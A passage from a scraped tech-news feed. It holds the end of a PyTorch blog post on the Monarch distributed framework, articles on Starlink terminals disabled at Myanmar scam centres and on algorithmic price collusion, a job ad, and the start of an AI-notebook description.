    &lt;p&gt;At launch, Monarch supports process meshes over GPU clusters—typically one process per GPU—onto which you can spawn actors into actor meshes. For local development, the same meshes can also run on a local development server.&lt;/p&gt;
    &lt;head rend="h4"&gt;Advanced APIs: Tensor Engine and RDMA Buffer&lt;/head&gt;
    &lt;p&gt;Monarch’s tensor engine brings distributed tensors to process meshes. It lets you write PyTorch programs as if the entire cluster of GPUs were attached to the machine running the script. For bulk data movement, Monarch also provides an RDMA buffer API, enabling direct, high-throughput transfers between processes on supported NICs.&lt;/p&gt;
    &lt;p&gt;Extensive details and more detailed examples can be found on our GitHub page.&lt;/p&gt;
    &lt;head rend="h4"&gt;A Simple Example&lt;/head&gt;
    &lt;p&gt;Monarch code imperatively describes how to create processes and actors using a simple Python API:&lt;/p&gt;
    &lt;quote&gt;from monarch.actor import Actor, endpoint, this_host procs = this_host().spawn_procs({"gpus": 8}) # define an actor that has one method class Example(Actor): @endpoint def say_hello(self, txt): return f"hello {txt}" # spawn the actors actors = procs.spawn("actors", Example) # have them say hello hello_future = actors.say_hello.call("world") # print out the results print(hello_future.get())&lt;/quote&gt;
    &lt;p&gt;In the above example, we define an Actor called “Example” that is deployed on 8 GPUs on the local host. The controller then invokes this example across the host and waits for their response. The actors can expose a variety of interfaces.&lt;/p&gt;
    &lt;head rend="h4"&gt;Slicing Meshes&lt;/head&gt;
    &lt;p&gt;We express broadcasted communication by organizing actors into a Mesh – a multidimensional container with named dimensions. For instance, a cluster might have dimensions {“hosts”: 32, “gpus”: 8}. Dimension names are normally things like “hosts”, indexing across the hosts in a cluster, or “gpus”, indexing across things in a machine.&lt;/p&gt;
    &lt;quote&gt;from monarch.actor import Actor, endpoint, this_host procs = this_host().spawn_procs({"gpus": 8}) # define an actor that has two methods class Example(Actor): @endpoint def say_hello(self, txt): return f"hello {txt}" @endpoint def say_bye(self, txt): return f"goodbye {txt}" # spawn the actors actors = procs.spawn("actors", Example) # have half of them say hello hello_fut = actors.slice(gpus=slice(0,4)).say_hello.call("world") # the other half say good bye bye_fut = actors.slice(gpus=slice(4,8)).say_bye.call("world") print(hello_fut.get()) print(bye_fut.get())&lt;/quote&gt;
    &lt;head rend="h4"&gt;Fault Recovery&lt;/head&gt;
    &lt;p&gt;Users can express distributed programs that can error through pythonic try, except blocks. Complex fault detection and fault recovery schemes can be built on top of these primitives. The following showcases handling a simple runtime Exception in a remote actor.&lt;/p&gt;
    &lt;quote&gt;from monarch.actor import Actor, endpoint, this_host procs = this_host().spawn_procs({"gpus": 8}) class Example(Actor): @endpoint def say_hello(self, txt): return f"hello {txt}" @endpoint def say_bye(self, txt): raise Exception("saying bye is hard") actors = procs.spawn("actors", Example) hello_fut = actors.slice(gpus=slice(0,4)).say_hello.call("world") bye_fut = actors.slice(gpus=slice(4,8)).say_bye.call("world") try: print(hello_fut.get()) except: print("couldn't say hello") try: print(bye_fut.get()) except Exception: print("got an exception saying bye")&lt;/quote&gt;
    &lt;p&gt;See “Case Study 2: Fault Tolerance in Large Scale Pre Training” for a more realistic use case.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Monarch Backend&lt;/head&gt;
    &lt;p&gt;Monarch is split into a Python-based frontend, and a backend implemented in Rust. Python is the lingua franca of machine learning, and our Python frontend APIs allow users to seamlessly integrate with existing code and libraries (like PyTorch!), and to use Monarch with interactive computing tools like Jupyter notebooks. Our Rust-based backend facilitates our performance, scale, and robustness — we amply use Rust’s fearless concurrency in Monarch’s implementation.&lt;/p&gt;
    &lt;head rend="h3"&gt;Hyperactor and hyperactor_mesh&lt;/head&gt;
    &lt;p&gt;At the bottom of the stack is a Rust-based actor framework called hyperactor. Hyperactor is a low-level distributed actor system, focused on performant message passing and robust supervision. hyperactor_mesh is built on top of hyperactor, and combines its various components into an efficient “vectorized” actor implementation. Hyperactor_mesh is oriented towards providing actor operations cheaply over large meshes of actors.&lt;/p&gt;
    &lt;p&gt;Monarch’s core Python APIs, in turn, are fairly thin wrappers around hyperactor_mesh.&lt;/p&gt;
    &lt;head rend="h3"&gt;Scalable messaging&lt;/head&gt;
    &lt;p&gt;Everything in Monarch relies on scalable messaging: the core APIs supporting casting messages to large meshes of actors. Hyperactor achieves this through two mechanisms: multicast trees and multipart messaging.&lt;/p&gt;
    &lt;p&gt;First, in order to support multicasting, Hyperactor sets up multicast trees to distribute messages. When a message is cast, it is first sent to some initial nodes, which then forward copies of the message to a set of its children, and so on, until the message has been fully distributed throughout the mesh. This lets us avoid single-host bottlenecks, effectively using the whole mesh as a distributed cluster for message forwarding.&lt;/p&gt;
    &lt;p&gt;Second, we ensure that the control plane is never in the critical path of data delivery. For example, we use multipart messaging to avoid copying, to enable sharing data across high-fanout sends (such as those that occur in our multicast trees), and materialize into efficient, vectorized writes managed by the OS.&lt;/p&gt;
    &lt;head rend="h2"&gt;Case Studies&lt;/head&gt;
    &lt;p&gt;We believe that this general purpose API and its native integration with PyTorch will unlock the next generation of AI applications at scale and the more complex orchestration requirements that they present.&lt;/p&gt;
    &lt;head rend="h3"&gt;Case Study 1: Reinforcement Learning&lt;/head&gt;
    &lt;p&gt;Reinforcement learning has been critical to the current generation of frontier models. RL enables models to do deep research, perform tasks in an environment and solve challenging problems such as math and code. For a deeper dive, we recommend this post for a deeper dive into the topics.&lt;/p&gt;
    &lt;p&gt;In order to train a reasoning model (see figure below), generator processes produce prompts from the reasoning model specializing in a specific domain (say, programming code generation). The generator uses these prompts (an incomplete coding problem statement) to derive a set of solutions or trajectories (executable code in this example) often interacting with the world through tools (compiler) and environments. Reward pipelines evaluate these solutions and come up with scores. These scores and rewards are used to train the same model whose weights are then transferred back to the systems that generated the prompt responses.&lt;/p&gt;
    &lt;p&gt;This constitutes a single training loop! As illustrated in the figure below, this is effectively a real-time pipeline of a number of heterogeneous computations within a training loop that may have to be orchestrated and scaled individually.&lt;/p&gt;
    &lt;p&gt;When implementing the RL example above in Monarch, each component — generator, trainer, inference engine, reward pipeline — might be represented by a mesh: a mesh of generators, a mesh of trainers, a mesh of inference nodes, a mesh of reward pipelines. (The figure above shows a simplistic example with only two meshes: generator and trainer).&lt;/p&gt;
    &lt;p&gt;The training script then uses these meshes to orchestrate the overall flow of the job: telling the generator mesh to start working from a new batch of prompts, passing the data to the training mesh when they are done, and updating the inference mesh when a new model snapshot is ready. The orchestrator is written as an ordinary Python program, calling methods on meshes and passing data between them. Because Monarch supports remote memory transfers (RDMA) natively, the actual data is transferred directly between members of meshes (just like you might copy a tensor from one GPU to another), enabling efficient and scalable workflows.&lt;/p&gt;
    &lt;head rend="h4"&gt;VERL&lt;/head&gt;
    &lt;p&gt;Volcano Engine Reinforcement Learning (VERL) is a widely used Reinforcement Learning framework in the industry today.&lt;/p&gt;
    &lt;p&gt;We integrated Monarch with VERL as a proof-of-concept and post-trained the Qwen-2.5-7B math model using GRPO on a curated math dataset and evaluated it on the AIME 2024 benchmark. We trained for 500+ training steps on H200 GPUs using Megatron-LM scaling progressively from 16, 64, 1024 to 2048 GPUs. The runs were stable and yielded good numerical parity with existing options, demonstrating that Monarch can orchestrate existing RL frameworks.&lt;/p&gt;
    &lt;p&gt;We are actively working on open-sourcing this integration to allow future users to evaluate Monarch as an option in their VERL jobs.&lt;/p&gt;
    &lt;head rend="h4"&gt;TorchForge&lt;/head&gt;
    &lt;p&gt;TorchForge represents a different approach: a pytorch native RL framework designed from the ground up with Monarch primitives.&lt;/p&gt;
    &lt;p&gt;TorchForge’s goal is to let researchers express RL algorithms as naturally as pseudocode, while Monarch handles the distributed complexity underneath. The result is code that looks like this:&lt;/p&gt;
    &lt;quote&gt;async def continuous_rollouts(): while True: prompt, target = await dataloader.sample.route() response = await policy.generate.route(prompt) reward = await reward.evaluate_response.route(prompt, response.text, target) await replay_buffer.add.route(Episode(...))&lt;/quote&gt;
    &lt;p&gt;No distributed coordination code, no retry logic, just RL written in Python.&lt;/p&gt;
    &lt;head rend="h4"&gt;Building on Monarch: Services and TorchStore&lt;/head&gt;
    &lt;p&gt;This clean API is possible because torchforge builds two key abstractions on Monarch’s primitives:&lt;/p&gt;
    &lt;p&gt;“Services” wrap Monarch ActorMeshes with RL-specific patterns. They leverage Monarch’s fault tolerance, resource allocation, and mailbox system, while adding patterns like load-balanced routing (`.route()`), parallel broadcasts (`.fanout()`), and sticky sessions for stateful operations.&lt;/p&gt;
    &lt;quote&gt;# A service is a managed group of ActorMeshes with routing primitives policy = PolicyActor.options( procs=8, with_gpus=True, num_replicas=16 # Creates 16 replicas, each with 8 GPUs ).as_service() # Services provide RL-friendly adverbs built on Monarch actors response = await policy.generate.route(prompt) # Load-balanced routing await policy.update_weights.fanout(version) # Parallel broadcast&lt;/quote&gt;
    &lt;p&gt;TorchStore is a distributed key-value store for PyTorch tensors that handles weight synchronization between training and inference. Built on Monarch’s RDMA primitives and single-controller design, it provides simple DTensor APIs while efficiently resharding weights on the fly – critical for off-policy RL where training and inference use different layouts.&lt;/p&gt;
    &lt;p&gt;These abstractions demonstrate Monarch’s composability: torchforge uses Monarch’s primitives (actors, RDMA, fault tolerance) as building blocks to create RL-specific infrastructure. The resulting framework handles coordination complexity at the infrastructure layer, letting researchers focus on algorithms.&lt;/p&gt;
    &lt;p&gt;For detailed examples of Forge’s APIs, component integration, and design philosophy, see our torchforge blog post.&lt;/p&gt;
    &lt;head rend="h3"&gt;Case Study 2: Fault Tolerance in Large Scale Pre Training&lt;/head&gt;
    &lt;p&gt;Hardware and software failures are common and frequent at scale. For example, in our Llama3 training runs we experienced 419 interruptions across a 54 day training window for a 16k GPU training job. This averages to about one failure every 3 hours. If we project this out to 10s of thousands of GPUs, this represents a failure once every hour or more frequently. Restarting the entire job for each of these failures will reduce the effective training time.&lt;/p&gt;
    &lt;p&gt;A solution is to use methods to further leverage distributed training through methods to make the numerics of the model more tolerant of having the various groups run more asynchronously. For example, TorchFT, released from PyTorch, provides a way to withstand failures of GPUs and allow the training to continue. One strategy is to use Hybrid Sharded Data Parallelism that combines fault tolerant DDP with FSDP v2 and PP. On failure we use torchcomms to gracefully handle errors and UI training on the next batch without downtime. This isolates failures to a single “replica group” and we can continue training with a subset of the original job.&lt;/p&gt;
    &lt;p&gt;Monarch integrates with TorchFT. Monarch centralizes the control plane into a single-controller model. Monarch uses its fault detection primitives to detect failures, and upon detection, can spin up new logical replica groups (Monarch Meshes) to join training once initialized. TorchFT’s Lighthouse server acts as a Monarch actor. Monarch provides configurable recovery strategies based on failure type. On faults, the controller first attempts fast, process‑level restarts within the existing allocation and only escalates to job reallocation when necessary, while TorchFT keeps healthy replicas stepping so progress continues during recovery.&lt;/p&gt;
    &lt;p&gt;We ran this code on a 30 node (240 H100s) Coreweave cluster, using the SLURM scheduler to train Qwen3-32B using torchtitan and TorchFT. We injected 100 injected failures every 3 minutes across multiple failure modes (segfaults, process kills, NCCL abort, host eviction, GIL deadlock). Monarch allows for configurable recovery strategies based on failure type — we observed this to be 60% faster by avoiding unnecessary job rescheduling (relative to full SLURM job restarts). We see 90s avg recovery for process failures and 2.5min avg recovery machine failures. For more details, see the README.&lt;/p&gt;
    &lt;head rend="h3"&gt;Case Study 3: Interactive Debugging with a Large GPU cluster&lt;/head&gt;
    &lt;p&gt;The actor framework is not just limited to large scale orchestration of complex jobs. It enables the ability to seamlessly debug complex, multi-GPU computations interactively. This capability represents a fundamental shift from traditional batch-oriented debugging to real-time, exploratory problem-solving that matches the scale and complexity of contemporary AI systems.&lt;/p&gt;
    &lt;p&gt;Traditional debugging workflows break down when confronted with the realities of modern ML systems. A model that trains perfectly on a single GPU may exhibit subtle race conditions, deadlocks, memory fragmentation, or communication bottlenecks when scaled across dozens of accelerators.&lt;/p&gt;
    &lt;p&gt;Monarch provides an interactive developer experience. With a local jupyter notebook, a user can drive a cluster as a Monarch mesh.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Persistent distributed compute allows very fast iteration without submitting new jobs&lt;/item&gt;
      &lt;item&gt;Workspace sync_workspace API quickly syncs local conda environment code to Mesh nodes.&lt;/item&gt;
      &lt;item&gt;Monarch provides a mesh-native, distributed debugger&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See a jupyter tutorial at pytorch.org&lt;/p&gt;
    &lt;head rend="h3"&gt;Monarch + Lightning AI Notebook&lt;/head&gt;
    &lt;p&gt;See Monarch in action as we launch a 256-GPU training job from a single Studio notebook, powered by TorchTitan. Experience seamless scaling, persistent resources, and interactive debugging — all in one single Notebook. The figure above shows this schema. Also, see our Monarch-Lightning blog post. In this example, the traditional SPMD TorchTitan workload is encapsulated as an Actor within Monarch, allowing users to pre-train large language models (such as Llama-3 and Llama-4) interactively from a Studio Notebook.&lt;/p&gt;
    &lt;p&gt;Monarch enables you to reserve and maintain compute resources directly from your local Studio Notebook in lightning. Even if your notebook session is interrupted or code disconnects, your cluster allocation remains active through Multi-Machine Training (MMT). This persistence of the process allocator allows you to iterate, experiment, and resume work seamlessly, reducing manual intervention and making the notebook a reliable control center for distributed training tasks.&lt;/p&gt;
    &lt;p&gt;Using Monarch’s Actor model, you can define and launch the Titan Trainer as an Actor on a process mesh, scaling your training jobs to hundreds of GPUs – all from within the Studio notebook. Monarch handles the orchestration, code and file sharing, and log collection, so you can reconfigure and relaunch jobs quickly. Logs and metrics are available directly in the notebook, as well as through external tools like Litlogger and WandB, making it easy to monitor and manage large-scale training.&lt;/p&gt;
    &lt;p&gt;Monarch brings interactive debugging to distributed training. You can set Python breakpoints in your Actor code, inspect running processes, and attach to specific actors for real-time troubleshooting – all from the notebook interface. After training, you can modify configurations or define new actors and relaunch jobs on the same resources without waiting for new allocations. This dynamic workflow accelerates experimentation and provides deep insight into your distributed training runs.&lt;/p&gt;
    &lt;p&gt;The code snippet in the Monarch-Lightning blog post shows the sample Lightning studio notebook for Monarch to pre-train the Llama-3.1 – 8B model using TorchTitan on 256 GPUs.&lt;/p&gt;
    &lt;head rend="h3"&gt;Try Monarch Today: Build, Scale, and Debug Distributed AI Workflows with Ease&lt;/head&gt;
    &lt;p&gt;Monarch is available now on GitHub—ready for you to explore, build with, and contribute to. Dive into the Monarch repo to get started, explore the documentation for deeper technical details, and try out our interactive Jupyter notebook to see Monarch in action. For an end-to-end example of launching large-scale training directly from your notebook, check out the Lightning.ai integration. Whether you’re orchestrating massive training runs, experimenting with reinforcement learning, or interactively debugging distributed systems, Monarch gives you the tools to do it all—simply and at scale.&lt;/p&gt;
    &lt;head rend="h3"&gt;Acknowledgments&lt;/head&gt;
    &lt;p&gt;Thank you to the whole Monarch team for making this work possible. Also, a special thanks to our Top Contributors on GitHub!&lt;/p&gt;
    &lt;p&gt;Ahmad Sharif, Allen Wang, Alireza Shamsoshoara, Amir Afzali, Amr Mahdi, Andrew Gallagher, Benji Pelletier, Carole-Jean Wu, Chris Gottbrath, Colin Taylor, Davide Italiano, Dennis van der Staay, Eliot Hedeman, Gayathri Aiyer, Gregory Chanan, Hamid Shojanazeri, James Perng, James Sun, Jana van Greunen, Jayasi Mehar, Joe Spisak, John William Humphreys, Jun Li, Kai Li, Keyan Pishdadian, Kiuk Chung, Lucas Pasqualin, Marius Eriksen, Marko Radmilac, Mathew Oldham, Matthew Zhang, Michael Suo, Matthias Reso, Osama Abuelsorour, Pablo Ruiz Fischer Bennetts, Peng Zhang, Rajesh Nishtala, Riley Dulin, Rithesh Baradi, Robert Rusch, Sam Lurye, Samuel Hsia, Shayne Fletcher, Tao Lin, Thomas Wang, Victoria Dudin, Vidhya Venkat, Vladimir Ivanov, Zachary DeVito&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://pytorch.org/blog/introducing-pytorch-monarch/"/><published>2025-10-23T10:15:12+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45680547</id><title>SpaceX disables 2,500 Starlink terminals allegedly used by Asian scam centers</title><updated>2025-10-23T15:37:59.105228+00:00</updated><content>&lt;doc fingerprint="3a4292199387e821"&gt;
  &lt;main&gt;
    &lt;p&gt;SpaceX said it disabled over 2,500 Starlink terminals suspected of being used by scammers in Myanmar. Lauren Dreyer, vice president of Starlink business operations, described the action in an X post last night after reports that Myanmar’s military shut down a major scam operation.&lt;/p&gt;
    &lt;p&gt;“SpaceX complies with local laws in all 150+ markets where Starlink is licensed to operate,” Dreyer wrote. “SpaceX continually works to identify violations of our Acceptable Use Policy and applicable law… On the rare occasion we identify a violation, we take appropriate action, including working with law enforcement agencies around the world. In Myanmar, for example, SpaceX proactively identified and disabled over 2,500 Starlink Kits in the vicinity of suspected ‘scam centers.'”&lt;/p&gt;
    &lt;p&gt;Starlink is not licensed to operate in Myanmar. While Dreyer didn’t say how the terminals were disabled, it’s known that Starlink can disable individual terminals based on their ID numbers or use geofencing to block areas from receiving signals.&lt;/p&gt;
    &lt;p&gt;On Monday, Myanmar state media reported that “Myanmar’s military has shut down a major online scam operation near the border with Thailand, detaining more than 2,000 people and seizing dozens of Starlink satellite Internet terminals,” according to an Associated Press article. The army reportedly raided a cybercrime center known as KK Park as part of operations that began in early September. The operations reportedly targeted 260 unregistered buildings and resulted in seizure of 30 Starlink terminals and detention of 2,198 people.&lt;/p&gt;
    &lt;p&gt;“Maj. Gen. Zaw Min Tun, the spokesperson for the military government, charged in a statement Monday night that the top leaders of the Karen National Union, an armed ethnic organization opposed to army rule, were involved in the scam projects at KK Park,” the AP wrote. The Karen National Union is “part of the larger armed resistance movement in Myanmar’s civil war” and “deny any involvement in the scams.”&lt;/p&gt;
    &lt;head rend="h2"&gt;Myanmar “notorious for hosting cyberscam operations”&lt;/head&gt;
    &lt;p&gt;Satellite images and drone footage recently showed “frenetic building work in the heavily guarded compounds around Myawaddy on the Thailand-Myanmar border, which appear to be using Elon Musk’s Starlink satellite Internet service on a huge scale,” Agence France-Presse (AFP) reported last week.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://arstechnica.com/tech-policy/2025/10/starlink-blocks-2500-dishes-allegedly-used-by-myanmars-notorious-scam-centers/"/><published>2025-10-23T11:15:44+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45680695</id><title>The Game Theory of How Algorithms Can Drive Up Prices</title><updated>2025-10-23T15:37:58.878724+00:00</updated><content>&lt;doc fingerprint="a0e491a025250e9b"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The Game Theory of How Algorithms Can Drive Up Prices&lt;/head&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;Imagine a town with two widget merchants. Customers prefer cheaper widgets, so the merchants must compete to set the lowest price. Unhappy with their meager profits, they meet one night in a smoke-filled tavern to discuss a secret plan: If they raise prices together instead of competing, they can both make more money. But that kind of intentional price-fixing, called collusion, has long been illegal. The widget merchants decide not to risk it, and everyone else gets to enjoy cheap widgets.&lt;/p&gt;
    &lt;p&gt;For well over a century, U.S. law has followed this basic template: Ban those backroom deals, and fair prices should be maintained. These days, it’s not so simple. Across broad swaths of the economy, sellers increasingly rely on computer programs called learning algorithms, which repeatedly adjust prices in response to new data about the state of the market. These are often much simpler than the “deep learning” algorithms that power modern artificial intelligence, but they can still be prone to unexpected behavior.&lt;/p&gt;
    &lt;p&gt;So how can regulators ensure that algorithms set fair prices? Their traditional approach won’t work, as it relies on finding explicit collusion. “The algorithms definitely are not having drinks with each other,” said Aaron Roth, a computer scientist at the University of Pennsylvania.&lt;/p&gt;
    &lt;p&gt;Yet a widely cited 2019 paper showed that algorithms could learn to collude tacitly, even when they weren’t programmed to do so. A team of researchers pitted two copies of a simple learning algorithm against each other in a simulated market, then let them explore different strategies for increasing their profits. Over time, each algorithm learned through trial and error to retaliate when the other cut prices — dropping its own price by some huge, disproportionate amount. The end result was high prices, backed up by mutual threat of a price war.&lt;/p&gt;
    &lt;p&gt;Implicit threats like this also underpin many cases of human collusion. So if you want to guarantee fair prices, why not just require sellers to use algorithms that are inherently incapable of expressing threats?&lt;/p&gt;
    &lt;p&gt;In a recent paper, Roth and four other computer scientists showed why this may not be enough. They proved that even seemingly benign algorithms that optimize for their own profit can sometimes yield bad outcomes for buyers. “You can still get high prices in ways that kind of look reasonable from the outside,” said Natalie Collina, a graduate student working with Roth who co-authored the new study.&lt;/p&gt;
    &lt;p&gt;Researchers don’t all agree on the implications of the finding — a lot hinges on how you define “reasonable.” But it reveals how subtle the questions around algorithmic pricing can get, and how hard it may be to regulate.&lt;/p&gt;
    &lt;p&gt;“Without some notion of a threat or an agreement, it’s very hard for a regulator to come in and say, ‘These prices feel wrong,’” said Mallesh Pai, an economist at Rice University. “That’s one reason why I think this paper is important.”&lt;/p&gt;
    &lt;head rend="h2"&gt;No Regrets&lt;/head&gt;
    &lt;p&gt;The recent paper studies algorithmic pricing through the lens of game theory, an interdisciplinary field at the border of economics and computer science that analyzes the mathematics of strategic competitions. It’s one way to explore the failures of pricing algorithms in a controlled setting.&lt;/p&gt;
    &lt;p&gt;“What we’re trying to do is create collusion in the lab,” said Joseph Harrington, a University of Pennsylvania economist who wrote an influential review paper on regulating algorithmic collusion and was not involved in the new research. “Once we do so, we want to figure out how to destroy collusion.”&lt;/p&gt;
    &lt;p&gt;To understand the key ideas, it helps to start with the simple game of rock-paper-scissors. A learning algorithm, in this context, can be any strategy that a player uses to choose a move in each round based on data from previous rounds. Players might try out different strategies over the course of the game. But if they’re playing well, they’ll ultimately converge to a state that game theorists call equilibrium. In equilibrium, each player’s strategy is the best possible response to the other’s strategy, so neither player has an incentive to change.&lt;/p&gt;
    &lt;p&gt;In rock-paper-scissors, the ideal strategy is simple: You should play a random move each round, choosing all three possibilities equally often. Learning algorithms shine if one player takes a different approach. In that case, choosing moves based on previous rounds can help the other player win more often than if they just played randomly.&lt;/p&gt;
    &lt;p&gt;Suppose, for instance, that after many rounds you realize that your opponent, a geologist, chose rock more than 50% of the time. If you’d played paper every round, you would have won more often. Game theorists refer to this painful realization as regret.&lt;/p&gt;
    &lt;p&gt;Researchers have devised simple learning algorithms that are always guaranteed to leave you with zero regret. Slightly more sophisticated learning algorithms called “no-swap-regret” algorithms also guarantee that whatever your opponent did, you couldn’t have done better by swapping all instances of any move with any other move (say, by playing paper every time you actually played scissors). In 2000, game theorists proved that if you pit two no-swap-regret algorithms against each other in any game, they’ll end up in a specific kind of equilibrium — one that would be the optimal equilibrium if they only played a single round. That’s an attractive property, because single-round games are much simpler than multi-round ones. In particular, threats don’t work because players can’t follow through.&lt;/p&gt;
    &lt;p&gt;In a 2024 paper, Jason Hartline, a computer scientist at Northwestern University, and two graduate students translated the classic results from the 2000 paper to a model of a competitive market, where players can set new prices every round. In that context, the results implied that dueling no-swap-regret algorithms would always end up with competitive prices when they reached equilibrium. Collusion was impossible.&lt;/p&gt;
    &lt;p&gt;However, no-swap-regret algorithms aren’t the only pricing game strategies in the world of online marketplaces. So what happens when a no-swap-regret algorithm faces a different benign-looking opponent?&lt;/p&gt;
    &lt;head rend="h2"&gt;The Price Is Wrong&lt;/head&gt;
    &lt;p&gt;According to game theorists, the best strategy to play against a no-swap-regret algorithm is simple: Start with a specific probability for each possible move, and then choose one move at random every round, no matter what your opponent does. The ideal assignment of probabilities for this “nonresponsive” approach depends on the specific game you’re playing.&lt;/p&gt;
    &lt;p&gt;In the summer of 2024, Collina and her colleague Eshwar Arunachaleswaran set out to find those optimal probabilities for a two-player pricing game. They found that the best strategy assigned strikingly high probabilities to very high prices, along with lower probabilities for a wide range of lower prices. If you’re playing against a no-swap-regret algorithm, this strange strategy will maximize your profit. “To me, it was a complete surprise,” Arunachaleswaran said.&lt;/p&gt;
    &lt;p&gt;Nonresponsive strategies look superficially innocuous. They can’t convey threats, because they don’t react to their opponents’ moves at all. But they can coax learning algorithms to raise their prices, and then reap profits by occasionally undercutting their competitors.&lt;/p&gt;
    &lt;p&gt;At first, Collina and Arunachaleswaran thought that this artificial scenario wasn’t relevant to the real world. Surely the player using the no-swap-regret algorithm would switch to a different algorithm after realizing that their competitor was profiting at their expense.&lt;/p&gt;
    &lt;p&gt;But as they studied the problem further and discussed it with Roth and two other colleagues, they realized their intuition was wrong. The two players in their scenario were already in a state of equilibrium. Their profits were nearly equal, and both were as high as possible as long as neither player switched to a different algorithm. Neither player would have an incentive to change strategy, so buyers would be stuck with high prices. What’s more, the precise probabilities weren’t that important. Many different choices led to high prices when pitted against a no-swap-regret algorithm. It’s an outcome you’d expect from collusion, but without any collusive behavior in sight.&lt;/p&gt;
    &lt;head rend="h2"&gt;It Pays To Be Dumb&lt;/head&gt;
    &lt;p&gt;So, what can regulators do? Roth admits he doesn’t have an answer. It wouldn’t make sense to ban no-swap-regret algorithms: If everyone uses one, prices will fall. But a simple nonresponsive strategy might be a natural choice for a seller on an online marketplace like Amazon, even if it carries the risk of regret.&lt;/p&gt;
    &lt;p&gt;“One way to have regret is just to be kind of dumb,” Roth said. “Historically, that hasn’t been illegal.”&lt;/p&gt;
    &lt;p&gt;As Hartline sees it, the problem of algorithmic collusion has a simple solution: Ban all pricing algorithms except the no-swap-regret algorithms that game theorists have long favored. There may be practical ways to do this: In their 2024 work, Hartline and his colleagues devised a method for checking if an algorithm has a no-swap-regret property without looking at its code.&lt;/p&gt;
    &lt;p&gt;Hartline acknowledged that his preferred solution wouldn’t prevent all bad outcomes when no-swap-regret algorithms compete with humans. But he argued that scenarios like the one in Roth’s paper aren’t cases of algorithmic collusion.&lt;/p&gt;
    &lt;p&gt;“Collusion is a two-way thing,” he said. “It fundamentally must be the case that there are actions a single player can do to not collude.”&lt;/p&gt;
    &lt;p&gt;Either way, the new work still leaves many open questions about how algorithmic pricing can go wrong in the real world.&lt;/p&gt;
    &lt;p&gt;“We still don’t understand nearly as much as we want,” Pai said. “It’s an important question for our time.”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.quantamagazine.org/the-game-theory-of-how-algorithms-can-drive-up-prices-20251022/"/><published>2025-10-23T11:38:49+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45680847</id><title>Nango (YC W23) is hiring Staff Back end Engs (remote)</title><updated>2025-10-23T15:37:58.645502+00:00</updated><content>&lt;doc fingerprint="ab8ec493530d96ab"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Shape the future of product integrations&lt;/head&gt;
    &lt;p&gt;We are a veteran team of dev-tool lovers. &lt;lb/&gt;We are passionate with serving developers, out in the open, with humility.&lt;/p&gt;
    &lt;head rend="h2"&gt;What is Nango?&lt;/head&gt;
    &lt;p&gt;Weâre building the integration layer for modern B2B software. Integrations are essential but often painful to buildâso weâre making them simple, reliable, and native. As companies adopt more software and AI becomes increasingly data-hungry, seamless integration is no longer optional.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why join?&lt;/head&gt;
    &lt;head rend="h3"&gt;Fully Remote&lt;/head&gt;
    &lt;p&gt;Our global team operates remotely with modern tools, valuing outcomes over hours.&lt;/p&gt;
    &lt;head rend="h3"&gt;Open-Source&lt;/head&gt;
    &lt;p&gt;We champion transparency, community and developer friendliness.&lt;/p&gt;
    &lt;head rend="h3"&gt;Developer Tool&lt;/head&gt;
    &lt;p&gt;Work for your peers, on pain points you know, with a fast feedback loop.&lt;/p&gt;
    &lt;head rend="h3"&gt;Technical challenges&lt;/head&gt;
    &lt;p&gt;From DevExp to high scale to API fragmentation, we work on hard problems.&lt;/p&gt;
    &lt;head rend="h3"&gt;Expert-Led&lt;/head&gt;
    &lt;p&gt;We are developer infrastructure veterans from Uber, Netlify, Algolia.&lt;/p&gt;
    &lt;head rend="h3"&gt;Traction&lt;/head&gt;
    &lt;p&gt;With fast-growing revenues &amp;amp; usage, itâs a perfect time to join.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.nango.dev/careers"/><published>2025-10-23T12:00:11+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45680937</id><title>Show HN: Deta Surf – An open source and local-first AI notebook</title><updated>2025-10-23T15:37:57.862557+00:00</updated><content>&lt;doc fingerprint="fc0186987a7cfe3"&gt;
  &lt;main&gt;
    &lt;p&gt;Deta Surf is an AI notebook that brings all your files and the web directly into your stream of thought.&lt;/p&gt;
    &lt;p&gt;It’s meant for simultaneous research and thinking that minimizes the grunt work: manually searching, opening windows &amp;amp; tabs, scrolling, copying and pasting into a document editor.&lt;/p&gt;
    &lt;p&gt;Surf is primarily built in Svelte, TypeScript and Rust, runs on MacOS, Windows &amp;amp; Linux, stores data locally in open formats, and is open source.&lt;/p&gt;
    &lt;p&gt;Most applications are focused on a single task, or a single media type: notes, websites, or PDFs. Real thinking requires juggling media across sources to make connections and synthesize ideas. We want to help people think better, across all their media.&lt;/p&gt;
    &lt;p&gt;Surf is built to be personal and open, in service of the user. This means local first data, open data formats, open source, and openness with respect to AI models. Read more.&lt;/p&gt;
    &lt;p&gt;Checkout the GitHub releases for the latest stable version of Surf for MacOS, Windows and Linux.&lt;/p&gt;
    &lt;p&gt;You can also download Surf with some managed &amp;amp; additional features (e.g. AI) from the Deta website. That version is subject to different terms.&lt;/p&gt;
    &lt;p&gt;For building from source and local development, see CONTRIBUTING.md.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;YouTube Notes: visit a YouTube video and ask a question&lt;/item&gt;
      &lt;item&gt;PDF Notes: open a PDF and ask a question&lt;/item&gt;
      &lt;item&gt;Create an applet: use the "app generation" tool and ask for an app&lt;/item&gt;
      &lt;item&gt;Notes that search the web: use the "web search" tool and ask a question with "search" in it&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Store almost any media in a private library on your computer, in an open and transparent format.&lt;/p&gt;
    &lt;list rend="ul"&gt;
